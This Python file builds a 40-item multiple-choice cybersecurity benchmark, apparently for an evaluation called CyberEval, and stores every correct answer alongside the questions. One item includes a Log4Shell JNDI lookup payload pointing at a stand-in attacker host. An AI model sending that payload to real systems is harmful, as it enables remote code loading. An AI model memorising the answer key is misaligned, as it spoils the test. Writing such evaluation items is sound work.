"""40 new Tier 4/5 questions for the CyberEval hard-question expansion (ARRAY revision).

Each item is defined canonically as (dimension, difficulty, question, correct_answer, [distractors]).
The build() function places the correct answer at a rotated position (i % 4) so that answer
positions are exactly balanced across the bank (10 items per position for 40 items) and no
position bias is introduced into the evaluation.

Design rules (see reviews/new_questions_draft.md):
- T4: multi-concept synthesis, applied scenarios, real tooling/protocol edge cases.
- T5: expert-level, adversarial or exotic edge cases.
- 4 choices, exactly one correct, no text sourced from public certification exams.
"""

import random

# (dimension, difficulty, question, correct, [d1, d2, d3])
_RAW = [
    # --- VK: Vulnerability Knowledge ---
    ("VK", 4,
     "Under CVSS v3.1 base metrics, which metric combination produces a base score of exactly 10.0?",
     "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
     ["AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      "AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"]),
    ("VK", 4,
     "An API gateway validates a JSON request against a schema that rejects a dangerous field, but the backend application's parser reads the first occurrence of a duplicated key while the gateway validated the second. Which vulnerability class does this exploit?",
     "Duplicate-key parsing inconsistency (JSON deserialization discrepancy)",
     ["HTTP request smuggling", "SQL injection", "Open redirect"]),
    ("VK", 4,
     "A tester sends ${jndi:ldap://attacker.example/x} as user-controlled input to a Java application running Log4j 2.14.1. In which configuration does the lookup NOT trigger an outbound connection?",
     "The application sets log4j2.formatMsgNoLookups=true",
     ["The JVM runs on Java 8u191 or later",
      "The logger level is set to ERROR",
      "The input is placed in the ThreadContext map"]),
    ("VK", 4,
     "A 64-bit Linux binary has a strcpy() stack buffer overflow. The binary was compiled with ASLR and NX enabled but WITHOUT a stack canary. Which of the following is still required for reliable arbitrary code execution?",
     "A memory leak disclosing a code pointer to defeat ASLR",
     ["A separate stack-canary bypass",
      "Disabling SELinux at runtime",
      "Recompiling the binary"]),
    ("VK", 5,
     "In a Spectre-v1 (bounds check bypass) attack, why must the attacker use a covert channel such as cache timing to learn the speculatively read secret?",
     "Speculative results are architecturally rolled back, so the secret never reaches registers or memory; only microarchitectural traces persist",
     ["The CPU purges all cache lines whenever a misprediction occurs",
      "The secret is stored encrypted in physical memory",
      "Branch predictors ignore indirect branches"]),

    # --- TI: Threat Intelligence ---
    ("TI", 4,
     "According to MITRE ATT&CK, which technique-sub-technique pairing is INCORRECT?",
     "T1055 Process Injection -> T1055.009 Process Doppelganging",
     ["T1059 Command and Scripting Interpreter -> T1059.001 PowerShell",
      "T1003 OS Credential Dumping -> T1003.002 Security Account Manager",
      "T1566 Phishing -> T1566.002 Spearphishing Link"]),
    ("TI", 4,
     "An analyst observes a host sending SMB SESSION_SETUP requests with NTLMSSP negotiation to dozens of internal servers in rapid succession, with no follow-up file operations. Which adversary behavior is most consistent with this traffic?",
     "Credential harvesting / NTLM relay scanning",
     ["RDP password brute forcing",
      "DNS tunneling exfiltration",
      "WMI-based remote command execution"]),
    ("TI", 4,
     "Which statement about the Diamond Model of Intrusion Analysis is correct?",
     "Its four core features are adversary, capability, infrastructure, and victim",
     ["It defines seven sequential phases like the Cyber Kill Chain",
      "It can only be applied when full packet captures are available",
      "It replaces MITRE ATT&CK for technique mapping"]),
    ("TI", 4,
     "Which best explains why threat intelligence programs prefer sharing TTPs over raw IOCs?",
     "TTPs describe adversary behavior and remain valid after infrastructure changes; IOCs are perishable",
     ["IOCs cannot be represented in structured formats",
      "TTPs are always machine-readable without context",
      "Sharing IOCs requires legal clearance in all jurisdictions"]),
    ("TI", 5,
     "A vendor report attributes an intrusion to a named nation-state APT group based primarily on overlapping C2 domains, a common malware family, and the target industry. Which analytic concern is most significant for this attribution?",
     "False attribution driven by commodity tooling and shared infrastructure used by multiple groups",
     ["Survivorship bias in victim telemetry",
      "Selection bias from honeypot data",
      "Rounding error in timestamps"]),

    # --- SC: Secure Coding ---
    ("SC", 4,
     "A web app renders untrusted input inside a JavaScript template literal within an inline <script> block. Which mitigation reliably prevents script injection in this context?",
     "Escaping for the JavaScript string context (backslash-escaping quotes/backslashes, or JSON.stringify)",
     ["HTML entity encoding of the input",
      "URL-encoding the input",
      "Adding CSP script-src 'self' while keeping 'unsafe-inline' enabled so the existing inline script still runs"]),
    ("SC", 4,
     "An application logs full HTTP request bodies to a central log store readable by application-support staff; a login request containing a password is therefore visible to them. Which CWE class does this primarily fall under?",
     "CWE-532 Insertion of Sensitive Information into Log File",
     ["CWE-89 SQL Injection",
      "CWE-352 Cross-Site Request Forgery",
      "CWE-601 Open Redirect"]),
    ("SC", 4,
     "Which sequence correctly validates an RS256 JWT received at an API?",
     "Parse the header; retrieve the signing key from the issuer's JWKS using kid and alg; verify the signature; then validate exp/nbf/iss/aud claims",
     ["Validate exp/nbf/iss/aud first, and verify the signature only if those claims look suspicious",
      "Trust the kid claim and use the public key embedded in the token itself",
      "Skip signature verification whenever the alg header is HS256, because HMAC keys are symmetric"]),
    ("SC", 4,
     "An attacker notices that a CDN's cache key for /profile includes the URL path but ignores the Host header and query string, and that an unkeyed header X-Forwarded-Host is reflected in the response body. Which attack does this enable?",
     "Web cache poisoning",
     ["HTTP response splitting", "DNS rebinding", "Cache busting"]),
    ("SC", 4,
     "A Java application accepts a serialized object inside a cookie and deserializes it to restore session state. Which CWE most directly classifies this pattern?",
     "CWE-502 Deserialization of Untrusted Data",
     ["CWE-79 Cross-Site Scripting",
      "CWE-352 Cross-Site Request Forgery",
      "CWE-798 Use of Hard-coded Credentials"]),
    ("SC", 4,
     "In the OAuth 2.0 authorization code flow, which parameter binds the authorization request to the user's browser session and mitigates CSRF / authorization-code injection?",
     "The state parameter",
     ["The nonce parameter", "The PKCE code_verifier", "The scope parameter"]),
    ("SC", 5,
     "Why is HTML entity encoding insufficient to prevent XSS when untrusted data is placed inside an UNQUOTED attribute value?",
     "Entities are decoded before attribute parsing, so an encoded space (&#32;) becomes a delimiter and an attacker can inject a new attribute such as onmouseover",
     ["Browsers do not decode entities inside attribute values",
      "CSP blocks entity decoding",
      "Unquoted attributes are ignored by browsers"]),
    ("SC", 5,
     "Why does a naive byte-by-byte == comparison of a received MAC against the expected MAC enable forgery, and what is the standard fix?",
     "Early exit on the first differing byte leaks the length of the correct prefix through timing, enabling byte-at-a-time guessing; use a constant-time comparison such as hmac.compare_digest",
     ["The comparison truncates the MAC to 32 bits",
      "Timing leaks only exist over the network, so local comparisons are safe",
      "The fix is to compare MACs only after decrypting the message"]),

    # --- IR: Incident Response ---
    ("IR", 4,
     "Per the RFC 3227 order-of-volatility guidance, which evidence should be collected FIRST from a live system suspected of compromise?",
     "Contents of memory (RAM) and register state",
     ["A full image of the hard disk", "Firewall and router logs", "Backup tapes"]),
    ("IR", 4,
     "During a Windows host investigation of a phishing-delivered document, which artifact most reliably indicates when the malicious document was FIRST opened?",
     "The creation time of the Recent Items .lnk shortcut pointing to the document",
     ["The MFT entry's last modification time for the document",
      "The Event ID 4624 logon time",
      "The System Restore point creation time"]),
    ("IR", 4,
     "Ransomware is actively encrypting network file shares from a single domain-joined workstation. Which containment action is the BEST immediate step?",
     "Isolate the host at the network/EDR level while preserving power and memory for evidence collection",
     ["Power off the host immediately",
      "Restore affected shares from backup before containing the host",
      "Reimage the workstation immediately"]),
    ("IR", 4,
     "Which Windows Security event log ID indicates that the audit log was cleared?",
     "1102",
     ["4624", "4688", "7045"]),
    ("IR", 5,
     "A compromised web server receives web-shell commands from an attacker whose traffic arrives via a CDN. Which evidence source best reveals the attacker's true origin?",
     "The CDN provider's request logs for the period in question",
     ["The X-Forwarded-For header in application logs",
      "NetFlow records of the CDN edge node's connection to the origin",
      "The User-Agent string"]),

    # --- CG: Compliance & Governance ---
    ("CG", 4,
     "Under GDPR, when a data processor discovers a personal data breach, what is the deadline for notifying the data controller?",
     "Without undue delay",
     ["Within 24 hours", "Within 72 hours", "Within 30 days"]),
    ("CG", 4,
     "In NIST CSF 2.0, which function contains the ID.AM (Asset Management) category?",
     "Identify",
     ["Govern", "Protect", "Detect"]),
    ("CG", 4,
     "Under PCI DSS v4.0, how must stored primary account numbers (PAN) be protected?",
     "Rendered unreadable (e.g., encryption, tokenization, or masking) wherever stored, with access restricted",
     ["Stored in plaintext as long as the database itself is encrypted at rest",
      "Split across two separate databases",
      "Deleted within 90 days of authorization"]),
    ("CG", 4,
     "An organization decides NOT to deploy antivirus on air-gapped PLC workstations. Under ISO/IEC 27001:2022, what is required for this decision to be compliant?",
     "A documented risk treatment decision with formal risk acceptance, justified and approved by the risk owner",
     ["Antivirus is never required if the network is air-gapped",
      "The control is mandatory; no exception is possible",
      "Listing control A.8.7 as 'not applicable' in the statement of applicability without further justification"]),
    ("CG", 5,
     "A cloud service provider acting as a business associate (BA) under HIPAA suffers a breach of protected health information (PHI) it processes for a covered entity. Which statement is correct?",
     "The BA must notify the covered entity (no later than 60 days after discovery), and the covered entity is responsible for notification to individuals and HHS",
     ["The BA must notify HHS and affected individuals directly",
      "Neither party notifies if the breach was caused by a nation-state actor",
      "Both parties notify HHS, and HHS decides which notification is authoritative"]),

    # --- FA: Forensic Analysis ---
    ("FA", 4,
     "Which Windows artifact records the last execution time of an application even if the executable has since been deleted?",
     "Prefetch files (*.pf)",
     ["The SAM registry hive", "pagefile.sys", "The NTFS $LogFile"]),
    ("FA", 4,
     "Why must a hardware write blocker be used when acquiring a forensic image of a suspect drive?",
     "To prevent the acquisition host's operating system from modifying the evidence, preserving its integrity for chain of custody",
     ["To speed up the imaging process",
      "To decrypt BitLocker-encrypted volumes",
      "To mount the drive read-write for analysis"]),
    ("FA", 4,
     "Which macOS artifact retains application launch/usage timestamps across reboots and is commonly parsed in forensic investigations?",
     "The knowledgeC database (knowledgeC.db)",
     ["The /etc/hosts file", "The kcpassword file", "The dyld shared cache"]),
    ("FA", 4,
     "In a Linux memory image, which structure would an analyst traverse to enumerate recently loaded kernel modules?",
     "The linked list of struct module objects",
     ["The task_struct list", "The page tables", "The ext4 superblock"]),
    ("FA", 5,
     "Why does carving a JPEG from unallocated space using only its SOI (FFD8) and EOI (FFD9) markers often yield a truncated or corrupt image?",
     "FFD9 can legitimately appear inside compressed image data or embedded thumbnails, so a naive EOI search cuts the file short",
     ["JPEG data in unallocated space is always XOR-encrypted",
      "JPEG files are never aligned to sector boundaries",
      "The file system journal re-encodes JPEG data"]),
    ("FA", 5,
     "In an NTFS MFT entry, the $STANDARD_INFORMATION creation time differs from the $FILE_NAME creation time (the latter is earlier and matches surrounding system activity). What is the most likely explanation?",
     "Timestomping - an anti-forensic manipulation that altered only $STANDARD_INFORMATION",
     ["A clean system clock change",
      "The file was downloaded via a browser",
      "NTFS compression artifacts"]),

    # --- SA: Security Architecture ---
    ("SA", 4,
     "Which statement about TLS 1.3 cipher suites is correct?",
     "TLS 1.3 supports only AEAD cipher suites such as AES-GCM and ChaCha20-Poly1305",
     ["TLS 1.3 retains CBC-mode suites for backward compatibility",
      "RC4 remains available in TLS 1.3 when negotiated via legacy fallback",
      "TLS 1.3 removed server authentication entirely"]),
    ("SA", 4,
     "Which statement best describes a Kerberos Golden Ticket attack?",
     "The attacker forges a TGT offline using the krbtgt account's hash, granting the ability to issue service tickets for long durations",
     ["The attacker captures a service ticket and replays it",
      "The attacker requests a TGT without a password using AS-REP roasting",
      "The attacker brute-forces user passwords against the KDC"]),
    ("SA", 4,
     "What is the PRIMARY security benefit of network microsegmentation in a zero-trust architecture?",
     "Limiting lateral movement by restricting east-west traffic between workloads",
     ["Preventing all phishing attempts",
      "Eliminating the need for host-based firewalls",
      "Encrypting all north-south traffic"]),
    ("SA", 4,
     "Which security boundary does a DNS rebinding attack primarily target?",
     "The browser's same-origin policy, by making a domain resolve alternately to attacker-controlled and internal IP addresses",
     ["The cache of recursive DNS resolvers",
      "BGP route selection",
      "TLS certificate validation"]),
    ("SA", 5,
     "Why can certificate pinning still be defeated by an attacker performing TLS interception against an application running on a rooted device?",
     "On a rooted device the verification environment itself is compromised: the attacker can hook or patch the application's pinning logic at runtime, or install a rogue CA into the system trust store",
     ["Pinned certificates are published in Certificate Transparency logs and therefore useless",
      "TLS 1.3 removed support for pinning",
      "Pinning only applies to browser traffic, not to mobile applications"]),
    ("SA", 5,
     "An architecture terminates TLS at a load balancer and forwards traffic to backend services. Which statement is most accurate?",
     "Traffic between the load balancer and backends is plaintext unless re-encrypted (e.g., TLS re-origination or mTLS), so the internal link depends on network-layer trust",
     ["The connection is end-to-end encrypted by definition",
      "Terminating TLS at the load balancer satisfies zero-trust requirements without further measures",
      "Backends cannot identify clients when TLS is terminated"]),
]


def build(seed=42):
    """Build the final 40-item bank with balanced answer positions.

    The correct answer is rotated to position (i % 4) and the three distractors
    are shuffled into the remaining slots. Exactly 10 items per position for 40 items.
    """
    questions = []
    for i, (dim, diff, qtext, correct, distractors) in enumerate(_RAW):
        rng = random.Random(seed + i)
        others = distractors[:]
        rng.shuffle(others)
        target_pos = i % 4
        choices = [None] * 4
        choices[target_pos] = correct
        j = 0
        for k in range(4):
            if choices[k] is None:
                choices[k] = others[j]
                j += 1
        questions.append({
            "dimension": dim,
            "question": qtext,
            "choices": choices,
            "correct": target_pos,
            "difficulty": diff,
        })
    return questions


if __name__ == "__main__":
    from collections import Counter
    qs = build()
    print(f"built {len(qs)} questions")
    print("tier counts:", Counter(q["difficulty"] for q in qs))
    print("correct-position counts:", Counter(q["correct"] for q in qs))
    print("dimension counts:", Counter(q["dimension"] for q in qs))
